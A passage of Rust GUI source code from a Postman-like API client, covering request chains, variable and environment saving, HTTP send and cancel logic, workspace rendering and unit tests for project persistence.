            .filter(|editor| editor.read(cx).matches_project(&self.current().id));
        div().size_full().flex().flex_col()
            .child(toolbar)
            .child(div().flex_1().min_h_0()
                .children(editor.cloned())
                .when(editor.is_none(), |el| {
                    el.flex().items_center().justify_center()
                        .child(div().flex().flex_col().items_center().gap_2()
                            .child(div().text_xl().font_weight(FontWeight::SEMIBOLD).child("Build a request chain"))
                            .child(div().text_color(cx.theme().muted_foreground)
                                .child("Connect saved requests and pass outputs from one node to the next."))
                            .child(Button::new("first-chain").small().primary().label("New chain")
                                .on_click(cx.listener(|view, _, window, cx| view.open_chain_editor(None, window, cx)))))
                }))
            .into_any_element()
    }

    pub(super) fn save_chain_definition(
        &mut self,
        project_id: &str,
        chain_id: &str,
        chain: Option<fastman_core::RequestChain>,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) -> Result<()> {
        anyhow::ensure!(
            self.current().id == project_id,
            "The active project changed"
        );
        if self.editor_dirty {
            self.apply_editor(cx)
                .context("Apply the current request editor")?;
        }
        let project = &mut self.projects[self.active_project];
        if let Some(chain) = chain {
            anyhow::ensure!(
                chain
                    .steps
                    .iter()
                    .all(|step| project.find_request(&step.request_id).is_some()),
                "A step references a missing request"
            );
            if let Some(existing) = project.chains.iter_mut().find(|item| item.id == chain_id) {
                *existing = chain;
            } else {
                project.chains.push(chain);
            }
        } else {
            project.chains.retain(|item| item.id != chain_id);
        }
        self.transition_generation = self.transition_generation.wrapping_add(1);
        self.bump_project_revision(project_id);
        self.sync_dirty();
        self.save(Some(window), cx);
        cx.notify();
        Ok(())
    }

    pub(super) fn chain_run_snapshot(
        &mut self,
        project_id: &str,
        chain: fastman_core::RequestChain,
        cx: &mut Context<Self>,
    ) -> Result<(Project, Arc<dyn SecretStore>, tokio::runtime::Handle)> {
        anyhow::ensure!(
            self.current().id == project_id,
            "The active project changed"
        );
        if self.editor_dirty {
            self.apply_editor(cx)
                .context("Apply the current request editor")?;
        }
        self.ensure_http_runtime()?;
        let mut project = self.current().clone();
        project.chains = vec![chain];
        Ok((
            project,
            Arc::clone(&self.secret_store),
            self.runtime
                .as_ref()
                .expect("runtime initialized")
                .handle()
                .clone(),
        ))
    }

    pub(super) fn save_variables_and_environments(
        &mut self,
        submission: VariablesSubmission,
        sheet: Entity<VariablesSheetView>,
        _window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        if self.editor_dirty
            && let Err(err) = self.apply_editor(cx)
        {
            let msg = format!("Cannot apply editor changes: {err:#}");
            self.set_status(msg.clone(), true, cx);
            sheet.update(cx, |s, cx| {
                s.saving = false;
                s.error = Some(msg);
                cx.notify();
            });
            return;
        }
        let mut snapshot = self.current().clone();
        snapshot.variables = submission.variables.clone();
        snapshot.secret_variables = submission.secret_variables.clone();
        snapshot.environments = submission.environments.clone();
        snapshot.active_environment = submission.active_environment.clone();

        let project_id = snapshot.id.clone();
        let next_rev = self.current_edit_rev(&project_id).saturating_add(1);
        self.record_in_flight_save(&project_id, next_rev);
        self.set_status("Saving variables…", false, cx);

        let store = self.store.clone();
        let secret_store = Arc::clone(&self.secret_store);
        let sheet_weak = sheet.downgrade();
        let rx = self.persistence.submit_save_with_secrets(
            store,
            snapshot,
            next_rev,
            secret_store,
            submission.secret_plan,
        );
        self.spawn_io_callback(rx, cx, move |view, outcome, window, cx| match outcome {
            Ok(committed_rev) => {
                let entry = view
                    .project_edit_revs
                    .entry(project_id.clone())
                    .or_insert(0);
                *entry = (*entry).max(committed_rev);
                if let Some(target) = view.projects.iter_mut().find(|p| p.id == project_id) {
                    target.variables = submission.variables;
                    target.secret_variables = submission.secret_variables;
                    target.environments = submission.environments;
                    target.active_environment = submission.active_environment;
                }
                let _clean = view.finish_save_tracking(&project_id, next_rev, &Ok(committed_rev));
                view.refresh_resolved_variables();
                view.refresh_template_inspection(cx);
                view.set_status("Variables saved", false, cx);
                if let Some(sheet_entity) = sheet_weak.upgrade() {
                    sheet_entity.update(cx, |s, _| s.saving = false);
                    if let Some(w) = window {
                        w.close_sheet(cx);
                        w.push_notification(
                            Notification::success("Variables & environments saved"),
                            cx,
                        );
                    }
                }
            }
            Err(err_msg) => {
                if let Some(&tracked) = view.in_flight_saves.get(&project_id)
                    && tracked <= next_rev
                {
                    view.in_flight_saves.remove(&project_id);
                }
                view.sync_dirty();
                let msg = format!("Save variables failed: {err_msg}");
                view.set_status(msg.clone(), true, cx);
                if let Some(sheet_entity) = sheet_weak.upgrade() {
                    sheet_entity.update(cx, |s, cx| {
                        s.saving = false;
                        s.error = Some(msg.clone());
                        cx.notify();
                    });
                } else {
                    Self::push_window_notification(window, Notification::error(msg), cx);
                }
            }
        });
    }

    pub(super) fn set_active_environment(
        &mut self,
        env_id: Option<String>,
        window: Option<&mut Window>,
        cx: &mut Context<Self>,
    ) {
        if !self.projects[self.active_project].set_active_environment(env_id) {
            return;
        }
        self.refresh_resolved_variables();
        self.refresh_template_inspection(cx);
        let label = self
            .current()
            .active_env()
            .map(|env| format!("Environment: {}", env.name))
            .unwrap_or_else(|| "Environment: Base only".to_owned());
        let project_id = self.current().id.clone();
        self.bump_project_revision(&project_id);
        self.sync_dirty();
        self.enqueue_project_save(
            Some(label.into()),
            None,
            "Save environment failed",
            window,
            cx,
        );
        cx.notify();
    }

    fn quick_create_standard_environments(
        &mut self,
        window: Option<&mut Window>,
        cx: &mut Context<Self>,
    ) {
        if !self.current().environments.is_empty() {
            return;
        }
        let proj = &mut self.projects[self.active_project];
        let local_id = proj.add_environment("local");
        let _ = proj.add_environment("staging");
        let _ = proj.add_environment("prod");
        proj.set_active_environment(Some(local_id));
        self.refresh_resolved_variables();
        self.refresh_template_inspection(cx);
        let project_id = self.current().id.clone();
        self.bump_project_revision(&project_id);
        self.sync_dirty();
        self.enqueue_project_save(
            Some("Created local / staging / prod environments".into()),
            Some("Added local, staging, and prod environments".into()),
            "Create environments failed",
            window,
            cx,
        );
        cx.notify();
    }

    pub(super) fn sanitize_active_draft_credentials(
        &mut self,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        if self.selected_id.is_none() {
            return;
        }
        let mut snap = self.snapshot_draft_request(cx);
        let summary = sanitize_request_credentials(&mut snap);
        if summary.moved_to_session_auth == 0 && summary.stripped_fields == 0 {
            return;
        }
        self.editing_request_name = false;
        self.suppress_dirty = true;
        self.populate_editor_from_request(snap, true, window, cx);
        self.suppress_dirty = false;
        self.refresh_kv_counts(cx);
        self.refresh_body_json_valid(cx);
        self.mark_dirty(cx);
        let msg = format!(
            "Moved {} credential field(s) to session-only Auth and stripped {} field(s)",
            summary.moved_to_session_auth, summary.stripped_fields
        );
        self.set_status(msg.clone(), false, cx);
        window.push_notification(Notification::success(msg), cx);
    }

    pub(super) fn push_and_select_project(
        &mut self,
        project: Project,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        self.projects.push(project);
        let last = self.projects.len() - 1;
        let choices = project_choices(&self.projects);
        self.project_selector.update(cx, |sel, cx| {
            sel.set_items(choices, window, cx);
            sel.set_selected_index(Some(IndexPath::default().row(last)), window, cx);
        });
        self.switch_project(last, window, cx);
    }

    pub(super) fn cancel(&mut self, cx: &mut Context<Self>) {
        self.run_generation = self.run_generation.wrapping_add(1);
        self.in_flight_request_id = None;
        if let Some(abort) = self.pending_abort.take() {
            abort.abort();
        }
        self.pending = None;
        self.set_status("Request cancelled / idle", false, cx);
    }

    pub(super) fn send(&mut self, window: Option<&mut Window>, cx: &mut Context<Self>) {
        let expected_run_gen = self.run_generation;
        self.flush_current_project_then("Cannot send", window, cx, move |view, _, cx| {
            if view.run_generation == expected_run_gen {
                view.perform_send(cx);
            }
        });
    }

    fn ensure_http_runtime(&mut self) -> Result<()> {
        if self.runtime.is_none() {
            let runtime = tokio::runtime::Builder::new_multi_thread()
                .worker_threads(2)
                .enable_all()
                .build()
                .context("Build networking runtime")?;
            self.runtime = Some(runtime);
        }
        if self.engine.is_none() {
            let engine = HttpEngine::new().context("Build HTTP client")?;
            self.engine = Some(engine);
        }
        Ok(())
    }

    fn perform_send(&mut self, cx: &mut Context<Self>) {
        let Some(request) = self.current_request().cloned() else {
            return;
        };
        let request_id = request.id.clone();
        let resolved = self.resolved_variables.clone();
        self.cancel(cx);
        let sent_method = SharedString::from(request.method.clone());
        let sent_url = SharedString::from(fastman_core::security::redact_url_secrets(&request.url));
        let sent_method_fallback = sent_method.clone();
        let sent_url_fallback = sent_url.clone();
        if let Err(error) = self.ensure_http_runtime() {
            let msg = format!("Cannot initialize HTTP client: {error:#}");
            self.set_status(msg, true, cx);
            return;
        }
        self.in_flight_request_id = Some(request_id.clone());
        self.set_status(
            format!("Sending {} {}…", request.method, sent_url),
            false,
            cx,
        );

        let generation = self.run_generation;
        let engine = self.engine.as_ref().expect("engine initialized").clone();
        let runtime = self.runtime.as_ref().expect("runtime initialized");
        let handle = runtime.spawn(async move {
            match engine.send_for_display(&request, &resolved).await {
                Ok(response) => {
                    let status_line = SharedString::from(format!(
                        "{} {} · {} · {}",
                        response.status,
                        response.reason,
                        crate::response_view::format_duration(response.elapsed_ms),
                        crate::response_view::format_bytes(response.bytes_received),
                    ));
                    let entry = ResponseCacheEntry::from_response(response, sent_method, sent_url);
                    Ok((entry, status_line))
                }
                Err(error) => Err(ResponseCacheEntry::from_error(
                    error.to_string(),
                    sent_method,
                    sent_url,
                )),
            }
        });
        self.pending_abort = Some(handle.abort_handle());
        self.pending = Some(cx.spawn(async move |this, cx| {
            let result = handle.await;
            _ = this.update(cx, |view, cx| {
                if view.run_generation != generation {
                    return;
                }
                view.pending_abort = None;
                view.in_flight_request_id = None;
                match result {
                    Ok(Ok((entry, status_line))) => {
                        view.responses.insert(request_id, entry);
                        view.refresh_response_search_matches(cx);
                        view.reset_response_scroll();
                        view.set_status(status_line, false, cx);
                    }
                    Ok(Err(entry)) => {
                        view.responses.insert(request_id, entry);
                        view.refresh_response_search_matches(cx);
                        view.set_status("Request failed", true, cx);
                    }
                    Err(error) => {
                        view.responses.insert(
                            request_id,
                            ResponseCacheEntry::from_error(
                                error.to_string(),
                                sent_method_fallback,
                                sent_url_fallback,
                            ),
                        );
                        view.refresh_response_search_matches(cx);
                        view.set_status("Request interrupted", true, cx);
                    }
                }
                cx.notify();
            });
        }));
        cx.notify();
    }

    pub(super) fn toggle_theme(&mut self, window: &mut Window, cx: &mut Context<Self>) {
        let next = if cx.theme().is_dark() {
            ThemeMode::Light
        } else {
            ThemeMode::Dark
        };
        Theme::change(next, Some(window), cx);
        crate::theme::apply_crisp_motion(cx);
        self.set_status(format!("Theme: {}", next.name()), false, cx);
    }

    fn open_command_palette(&mut self, window: &mut Window, cx: &mut Context<Self>) {
        if window.has_active_dialog(cx)
            && self
                .active_command_palette
                .as_ref()
                .is_some_and(|weak| weak.upgrade().is_some())
        {
            self.active_command_palette = None;
            window.close_dialog(cx);
            return;
        }

        let weak_workspace = cx.weak_entity();
        let palette_view =
            cx.new(|cx| CommandPaletteView::new(self, weak_workspace.clone(), window, cx));
        self.active_command_palette = Some(palette_view.downgrade());
        let initial_focus = Cell::new(true);

        window.open_dialog(cx, move |dialog, window, cx| {
            if initial_focus.replace(false) {
                let palette = palette_view.clone();
                palette.update(cx, |view, cx| view.focus(window, cx));
            }
            let weak_close = weak_workspace.clone();
            dialog
                .w(px(640.))
                .close_button(false)
                .entrance(DialogEntrance::None)
                .py_2()
                .on_close(move |_, _, cx| {
                    let _ = weak_close.update(cx, |view, _| {
                        view.active_command_palette = None;
                    });
                })
                .child(palette_view.clone())
        });
    }

    fn render_request_response_area(&self, cx: &mut Context<Self>) -> AnyElement {
        match self.response_position {
            ResponsePosition::Bottom => v_resizable("request-response-panels-bottom")
                .child(
                    resizable_panel()
                        .size(px(360.))
                        .size_range(px(200.)..px(900.))
                        .child(self.render_request_panel(cx)),
                )
                .child(
                    resizable_panel()
                        .size_range(px(180.)..px(900.))
                        .child(self.render_response_panel(cx)),
                )
                .into_any_element(),
            ResponsePosition::Left => h_resizable("request-response-panels-left")
                .child(
                    resizable_panel()
                        .size_range(px(260.)..Pixels::MAX)
                        .child(self.render_response_panel(cx)),
                )
                .child(
                    resizable_panel()
                        .size_range(px(280.)..Pixels::MAX)
                        .child(self.render_request_panel(cx)),
                )
                .into_any_element(),
            ResponsePosition::Right => h_resizable("request-response-panels-right")
                .child(
                    resizable_panel()
                        .size_range(px(280.)..Pixels::MAX)
                        .child(self.render_request_panel(cx)),
                )
                .child(
                    resizable_panel()
                        .size_range(px(260.)..Pixels::MAX)
                        .child(self.render_response_panel(cx)),
                )
                .into_any_element(),
        }
    }
}

impl Render for WorkspaceView {
    fn render(&mut self, window: &mut Window, cx: &mut Context<Self>) -> impl IntoElement {
        let bg = cx.theme().background;
        let title_bar_bg = cx.theme().title_bar;
        let title_border = cx.theme().title_bar_border;
        let status_bg = cx.theme().status_bar;
        let status_border = cx.theme().status_bar_border;
        let fg = cx.theme().foreground;
        let muted_fg = cx.theme().muted_foreground;
        let is_dark = cx.theme().is_dark();

        let workspace_view = cx.weak_entity();
        let env_view = cx.weak_entity();
        let active_env_name = self.current().active_env().map(|env| env.name.clone());
        let var_count = self.current().effective_variable_count();
        let req_count = self.cached_request_count;

        let header = div()
            .h(px(44.))
            .px_3()
            .flex_shrink_0()
            .flex()
            .items_center()
            .gap_2()
            .bg(title_bar_bg)
            .border_b_1()
            .border_color(title_border)
            .child(
                Button::new("workspace-selector")
                    .ghost()
                    .small()
                    .dropdown_caret(true)
                    .icon(svg_icon("icons/layers.svg").small())
                    .label(self.workspaces[self.active_workspace].name.clone())
                    .dropdown_menu(move |mut menu, _, cx| {
                        let (choices, active_ws) = workspace_view
                            .upgrade()
                            .map(|entity| {
                                let view = entity.read(cx);
                                (
                                    view.workspaces
                                        .iter()
                                        .map(|w| w.name.clone())
                                        .collect::<Vec<_>>(),
                                    view.active_workspace,
                                )
                            })
                            .unwrap_or_default();
                        for (index, name) in choices.into_iter().enumerate() {
                            let view = workspace_view.clone();
                            menu = menu.item(
                                PopupMenuItem::new(name)
                                    .checked(index == active_ws)
                                    .on_click(move |_, window, cx| {
                                        let _ = view.update(cx, |view, cx| {
                                            view.switch_workspace(index, window, cx);
                                        });
                                    }),
                            );
                        }
                        let view_new = workspace_view.clone();
                        menu.separator().item(
                            PopupMenuItem::new("New Workspace...")
                                .icon(svg_icon("icons/plus.svg"))
                                .on_click(move |_, window, cx| {
                                    let _ = view_new.update(cx, |view, cx| {
                                        view.open_name_dialog(
                                            NameDialogKind::NewWorkspace,
                                            window,
                                            cx,
                                        );
                                    });
                                }),
                        )
                    }),
            )
            .child(
                div()
                    .flex()
                    .gap_1()
                    .children([(false, "Requests"), (true, "Chains")].map(
                        |(chain_mode, label)| {
                            let button =
                                Button::new(label)
                                    .small()
                                    .label(label)
                                    .on_click(cx.listener(move |view, _, window, cx| {
                                        if view.chain_mode == chain_mode {
                                            return;
                                        }
                                        if !chain_mode && view.chain_blocks_navigation(window, cx) {
                                            return;
                                        }
                                        view.chain_mode = chain_mode;
                                        cx.notify();
                                    }));
                            if self.chain_mode == chain_mode {
                                button.primary()
                            } else {
                                button.ghost()
                            }
                        },
                    )),
            )
            .child(div().flex_1())
            .child(
                Button::new("open-command-palette")
                    .small()
                    .outline()
                    .icon(svg_icon("icons/search.svg").small())
                    .label("Commands")
                    .when_some(
                        Kbd::global_binding_for_action(&OpenCommandPalette, window),
                        |btn, kbd| btn.child(kbd),
                    )
                    .tooltip("Open Command Palette (Ctrl+K)")
                    .on_click(cx.listener(|view, _, window, cx| {
                        view.open_command_palette(window, cx);
                    })),
            )
            .child(
                Button::new("env-selector")
                    .small()
                    .outline()
                    .dropdown_caret(true)
                    .icon(svg_icon("icons/layers.svg").small())
                    .label(
                        active_env_name
                            .clone()
                            .unwrap_or_else(|| "Base Env".to_owned()),
                    )
                    .tooltip("Switch active project environment")
                    .dropdown_menu(move |mut menu, _, cx| {
                        let (envs, active_id) = env_view
                            .upgrade()
                            .map(|entity| {
                                let proj = entity.read(cx).current();
                                (
                                    proj.environments
                                        .iter()
                                        .map(|e| (e.id.clone(), e.name.clone()))
                                        .collect::<Vec<_>>(),
                                    proj.active_environment.clone(),
                                )
                            })
                            .unwrap_or_default();

                        let v_base = env_view.clone();
                        menu = menu.item(
                            PopupMenuItem::new("Base only (No environment)")
                                .checked(active_id.is_none())
                                .on_click(move |_, window, cx| {
                                    let _ = v_base.update(cx, |view, cx| {
                                        view.set_active_environment(None, Some(window), cx);
                                    });
                                }),
                        );
                        for (env_id, env_name) in &envs {
                            let v_env = env_view.clone();
                            let id_pick = env_id.clone();
                            menu = menu.item(
                                PopupMenuItem::new(env_name.clone())
                                    .checked(active_id.as_deref() == Some(env_id.as_str()))
                                    .on_click(move |_, window, cx| {
                                        let _ = v_env.update(cx, |view, cx| {
                                            view.set_active_environment(
                                                Some(id_pick.clone()),
                                                Some(window),
                                                cx,
                                            );
                                        });
                                    }),
                            );
                        }
                        menu = menu.separator();
                        if envs.is_empty() {
                            let v_quick = env_view.clone();
                            menu = menu.item(
                                PopupMenuItem::new("Quick Add: local / staging / prod")
                                    .icon(svg_icon("icons/plus.svg"))
                                    .on_click(move |_, window, cx| {
                                        let _ = v_quick.update(cx, |view, cx| {
                                            view.quick_create_standard_environments(
                                                Some(window),
                                                cx,
                                            );
                                        });
                                    }),
                            );
                        }
                        let v_manage = env_view.clone();
                        menu.item(
                            PopupMenuItem::new("Manage Environments & Variables...")
                                .icon(svg_icon("icons/variable.svg"))
                                .on_click(move |_, window, cx| {
                                    let _ = v_manage.update(cx, |view, cx| {
                                        view.open_variables_sheet(window, cx);
                                    });
                                }),
                        )
                    }),
            )
            .child(
                Button::new("open-variables")
                    .small()
                    .outline()
                    .icon(svg_icon("icons/variable.svg").small())
                    .label("Variables")
                    .when(var_count > 0, |btn| btn.child(count_pill(var_count, cx)))
                    .tooltip("Edit variables, secrets, and environments")
                    .on_click(cx.listener(|view, _, window, cx| {
                        view.open_variables_sheet(window, cx);
                    })),
            )
            .child(
                Button::new("open-import")
                    .small()
                    .outline()
                    .icon(svg_icon("icons/import.svg").small())
                    .label("Import")
                    .tooltip("Import Collection v2.1 JSON or cURL")
                    .on_click(cx.listener(|view, _, window, cx| {
                        view.open_import_dialog(window, cx);
                    })),
            )
            .child(
                Button::new("toggle-theme")
                    .small()
                    .ghost()
                    .icon(
                        svg_icon(if is_dark {
                            "icons/sun.svg"
                        } else {
                            "icons/moon.svg"
                        })
                        .small(),
                    )
                    .tooltip(if is_dark {
                        "Switch to Light theme"
                    } else {
                        "Switch to Dark theme"
                    })
                    .on_click(cx.listener(|view, _, window, cx| {
                        view.toggle_theme(window, cx);
                    })),
            );

        let status_dot_color =
            if self.in_flight_request_id.is_some() || !self.in_flight_saves.is_empty() {
                cx.theme().info
            } else if self.status_is_error {
                cx.theme().danger
            } else {
                cx.theme().success
            };

        let status_bar = div()
            .h(px(26.))
            .px_3()
            .flex_shrink_0()
            .flex()
            .items_center()
            .justify_between()
            .gap_3()
            .bg(status_bg)
            .border_t_1()
            .border_color(status_border)
            .text_size(px(11.5))
            .text_color(muted_fg)
            .child(
                div()
                    .flex()
                    .items_center()
                    .gap_2()
                    .min_w_0()
                    .child(
                        div()
                            .w(px(7.))
                            .h(px(7.))
                            .rounded_full()
                            .flex_shrink_0()
                            .bg(status_dot_color),
                    )
                    .child(div().truncate().child(self.status.clone())),
            )
            .child(
                div()
                    .flex()
                    .items_center()
                    .gap_3()
                    .flex_shrink_0()
                    .when(self.selected_id.is_some() && !self.verify_tls, |row| {
                        let warn = cx.theme().warning;
                        row.child(
                            div()
                                .id("status-tls-warning")
                                .cursor_pointer()
                                .px_1p5()
                                .py(px(1.))
                                .rounded(px(4.))
                                .bg(warn.opacity(0.16))
                                .text_color(warn)
                                .text_size(px(11.))
                                .font_weight(FontWeight::MEDIUM)
                                .flex()
                                .items_center()
                                .gap_1()
                                .on_click(cx.listener(|view, _, _, cx| {
                                    view.section = 5;
                                    cx.notify();
                                }))
                                .child(svg_icon("icons/triangle-alert.svg").xsmall())
                                .child("TLS verification off (dev)"),
                        )
                    })
                    .when_some(active_env_name, |row, env_name| {
                        row.child(
                            div()
                                .px_1p5()
                                .py(px(1.))
                                .rounded(px(4.))
                                .bg(cx.theme().secondary)
                                .text_color(cx.theme().secondary_foreground)
                                .text_size(px(11.))
                                .font_weight(FontWeight::MEDIUM)
                                .child(format!("Env: {env_name}")),
                        )
                    })
                    .child(format!("{req_count} requests · {var_count} variables"))
                    .child(
                        div()
                            .flex()
                            .items_center()
                            .gap_1()
                            .child(
                                svg_icon("icons/shield-check.svg")
                                    .xsmall()
                                    .text_color(cx.theme().success),
                            )
                            .child("Local-first"),
                    ),
            );

        div()
            .id("fastman-root")
            .track_focus(&self.focus_handle)
            .on_action(cx.listener(|view, _: &SendRequest, window, cx| {
                if !view.chain_mode {
                    view.send(Some(window), cx);
                }
            }))
            .on_action(cx.listener(|view, _: &SaveRequest, window, cx| {
                if !view.chain_mode {
                    view.save_with_toast(window, cx);
                }
            }))
            .on_action(cx.listener(|view, _: &NewRequest, window, cx| {
                if view.chain_mode {
                    view.open_chain_editor(None, window, cx);
                } else {
                    view.add_request(window, cx);
                }
            }))
            .on_action(cx.listener(|view, _: &CloseActiveTab, window, cx| {
                if !view.chain_mode
                    && let Some(id) = view.selected_id.clone()
                {
                    view.close_tab(&id, window, cx);
                }
            }))
            .on_action(cx.listener(|view, _: &FocusUrl, window, cx| {
                if !view.chain_mode {
                    view.url.read(cx).focus_handle(cx).focus(window, cx);
                }
            }))
            .on_action(cx.listener(|view, _: &FocusSearch, window, cx| {
                if !view.chain_mode {
                    view.explorer_search
                        .read(cx)
                        .focus_handle(cx)
                        .focus(window, cx);
                }
            }))
            .on_action(cx.listener(|view, _: &ToggleTheme, window, cx| {
                view.toggle_theme(window, cx);
            }))
            .on_action(cx.listener(|view, _: &OpenVariables, window, cx| {
                view.open_variables_sheet(window, cx);
            }))
            .on_action(cx.listener(|view, _: &OpenImport, window, cx| {
                view.open_import_dialog(window, cx);
            }))
            .on_action(cx.listener(|view, _: &OpenCommandPalette, window, cx| {
                view.open_command_palette(window, cx);
            }))
            .size_full()
            .flex()
            .flex_col()
            .bg(bg)
            .text_size(px(13.))
            .text_color(fg)
            .child(header)
            .child(div().flex_1().min_h_0().child(if self.chain_mode {
                self.render_chain_workspace(cx)
            } else {
                h_resizable("workspace-panels")
                    .child(
                        resizable_panel()
                            .size(px(270.))
                            .size_range(px(210.)..px(480.))
                            .child(self.render_explorer_panel(cx)),
                    )
                    .child(
                        resizable_panel().child(
                            div()
                                .size_full()
                                .child(self.render_request_response_area(cx)),
                        ),
                    )
                    .into_any_element()
            }))
            .child(status_bar)
    }
}

#[cfg(test)]
mod tests {
    use super::WorkspaceView;
    use crate::request_editor::AuthKind;
    use crate::variables_sheet::{VariablesSheetView, VariablesSubmission};
    use fastman_core::curl;
    use fastman_core::model::{ApiRequest, Folder};
    use fastman_core::secrets::{MemorySecretStore, SecretStore as _};
    use fastman_core::storage::ProjectStore;
    use gpui::{AppContext, TestAppContext};

    #[test]
    fn fresh_workspace_has_no_sample_requests() {
        run_view_test(|| {
            let cx = TestAppContext::single();
            let root = tempfile::tempdir().unwrap();
            let store = ProjectStore::at(root.path());
            cx.update(gpui_kit::init);
            cx.update(|cx| {
                gpui_kit::open_window(Default::default(), cx, |window, cx| {
                    cx.new(|cx| {
                        let view = WorkspaceView::with_store(store, window, cx).unwrap();
                        assert!(view.current().collections[0].folders.is_empty());
                        assert!(view.current().first_request_id().is_none());
                        assert!(view.selected_id.is_none());
                        assert!(view.url.read(cx).value().is_empty());
                        view
                    })
                })
                .unwrap();
            });
        });
    }

    fn seed_request(store: &ProjectStore) {
        let mut project = store.create("Test project").unwrap();
        let mut folder = Folder::new("Test folder");
        folder
            .requests
            .push(ApiRequest::new("GET", "Test request", ""));
        project.collections[0].folders.push(folder);
        store.save(&project).unwrap();
    }

    #[test]
    fn activate_request_tab_selects_and_loads_without_duplicate_tabs() {
        run_view_test(check_activate_request_tab);
    }

    fn check_activate_request_tab() {
        let root = tempfile::tempdir().unwrap();
        let mut cx = TestAppContext::single();
        let store = ProjectStore::at(root.path());
        seed_request(&store);
        cx.update(gpui_kit::init);
        let (window, view) = cx
            .update(|cx| {
                gpui_kit::open_window(Default::default(), cx, |window, cx| {
                    cx.new(|cx| WorkspaceView::with_store(store, window, cx).unwrap())
                })
            })
            .unwrap();

        let request_id = cx
            .update_window(window, |_, _, cx| {
                view.update(cx, |view, _| view.current().first_request_id().unwrap())
            })
            .unwrap();

        for _ in 0..2 {
            cx.update_window(window, |_, window, cx| {
                view.update(cx, |view, cx| {
                    view.activate_request_tab(Some(request_id.clone()), Some(window), cx);
                    assert_eq!(view.selected_id.as_deref(), Some(request_id.as_str()));
                    assert_eq!(view.open_tabs, vec![request_id.clone()]);
                    assert_eq!(view.request_name.read(cx).value(), "Test request");
                });
            })
            .unwrap();
        }

        cx.update_window(window, |_, window, cx| {
            view.update(cx, |view, cx| {
                view.activate_request_tab(None, Some(window), cx);
                assert!(view.selected_id.is_none());
                assert_eq!(view.open_tabs, vec![request_id]);
                assert!(view.request_name.read(cx).value().is_empty());
            });
        })
        .unwrap();
    }

    #[test]
    fn project_switch_saves_draft_but_keeps_it_open_on_conflict() {
        run_view_test(check_project_switch);
    }

    #[test]
    fn failed_tree_move_stays_dirty_and_blocks_project_switch() {
        run_view_test(check_failed_tree_move);
    }

    fn drain_persistence(cx: &mut TestAppContext, view: &gpui::Entity<WorkspaceView>) {
        loop {
            let worker = cx.update(|cx| view.read(cx).persistence.clone());
            worker.flush_blocking();
            cx.run_until_parked();
            let idle = cx.update(|cx| view.read(cx).in_flight_saves.is_empty());
            if idle {
                break;
            }
        }
    }

    #[test]
    fn chain_edits_persist_and_referenced_requests_cannot_be_deleted() {
        run_view_test(|| {
            let root = tempfile::tempdir().unwrap();
            let store = ProjectStore::at(root.path());
            seed_request(&store);
            let mut cx = TestAppContext::single();
            cx.update(gpui_kit::init);
            let (window, view) = cx
                .update(|cx| {
                    gpui_kit::open_window(Default::default(), cx, |window, cx| {
                        cx.new(|cx| WorkspaceView::with_store(store.clone(), window, cx).unwrap())
                    })
                })
                .unwrap();
            let (project_id, mut chain) = cx
                .update_window(window, |_, window, cx| {
                    view.update(cx, |view, cx| {
                        let project_id = view.current().id.clone();
                        let request = view.current().first_request_id().unwrap();
                        let mut chain = fastman_core::RequestChain::new("Workflow");
                        chain.steps.push(fastman_core::ChainStep::new(&request));
                        view.save_chain_definition(
                            &project_id,
                            &chain.id,
                            Some(chain.clone()),
                            window,
                            cx,
                        )
                        .unwrap();
                        view.delete_request_now(&request, window, cx);
                        assert!(view.current().find_request(&request).is_some());
                        (project_id, chain)
                    })
                })
                .unwrap();
            drain_persistence(&mut cx, &view);
            assert_eq!(store.load(&project_id).unwrap().chains, [chain.clone()]);

            chain.name = "Updated workflow".into();
            chain.steps[0].enabled = false;
            cx.update_window(window, |_, window, cx| {
                view.update(cx, |view, cx| {
                    view.save_chain_definition(
                        &project_id,
                        &chain.id,
                        Some(chain.clone()),
                        window,
                        cx,
                    )
                    .unwrap();
                })
            })
            .unwrap();
            drain_persistence(&mut cx, &view);
            assert_eq!(store.load(&project_id).unwrap().chains, [chain.clone()]);

            cx.update_window(window, |_, window, cx| {
                view.update(cx, |view, cx| {
                    view.save_chain_definition(&project_id, &chain.id, None, window, cx)
                        .unwrap();
                })
            })
            .unwrap();
            drain_persistence(&mut cx, &view);
            assert!(store.load(&project_id).unwrap().chains.is_empty());
        });
    }

    fn run_view_test(test: fn()) {
        // Building the full view in debug mode exceeds the default test stack on Windows.
        let result = std::thread::Builder::new()
            .stack_size(16 * 1024 * 1024)
            .spawn(test)
            .unwrap()
            .join();
        if let Err(panic) = result {
            std::panic::resume_unwind(panic);
        }
    }

    fn check_failed_tree_move() {
        let root = tempfile::tempdir().unwrap();
        let mut cx = TestAppContext::single();
        let store = ProjectStore::at(root.path());
        seed_request(&store);
        cx.update(gpui_kit::init);
        let (window, view) = cx
            .update(|cx| {
                gpui_kit::open_window(Default::default(), cx, |window, cx| {
                    cx.new(|cx| WorkspaceView::with_store(store.clone(), window, cx).unwrap())
                })
            })
            .unwrap();

        let (project_id, request_id, original_folder) = cx
            .update_window(window, |_, window, cx| {
                view.update(cx, |view, cx| {
                    let project_id = view.current().id.clone();
                    let request_id = view.selected_id.clone().unwrap();
                    let original_folder =
                        view.current().request_parent_folder(&request_id).unwrap();
                    let collection_id = view.current().collections[0].id.clone();
                    view.projects.push(store.create("Second project").unwrap());
                    assert!(!view.dirty);

                    let other_instance = ProjectStore::at(root.path());
                    let mut external = other_instance.load(&project_id).unwrap();
                    external.name = "Externally renamed".into();
                    other_instance.save(&external).unwrap();

                    view.move_request_to_collection(&request_id, &collection_id, window, cx);
                    assert!(view.current().request_parent_folder(&request_id).is_none());
                    (project_id, request_id, original_folder)
                })
            })
            .unwrap();

        drain_persistence(&mut cx, &view);

        cx.update_window(window, |_, window, cx| {
            view.update(cx, |view, cx| {
                assert!(view.status.contains("modified on disk"));
                assert!(view.dirty, "The in-memory move still needs to be saved");
                view.switch_project(1, window, cx);
            });
        })
        .unwrap();

        drain_persistence(&mut cx, &view);

        cx.update_window(window, |_, _, cx| {
            let v = view.read(cx);
            assert_eq!(v.active_project, 0);
            assert!(v.dirty);
        })
        .unwrap();

        let other_instance = ProjectStore::at(root.path());
        let disk = other_instance.load(&project_id).unwrap();
        assert_eq!(disk.name, "Externally renamed");
        assert_eq!(
            disk.request_parent_folder(&request_id),
            Some(original_folder)
        );
    }

    fn check_project_switch() {
        let root = tempfile::tempdir().unwrap();
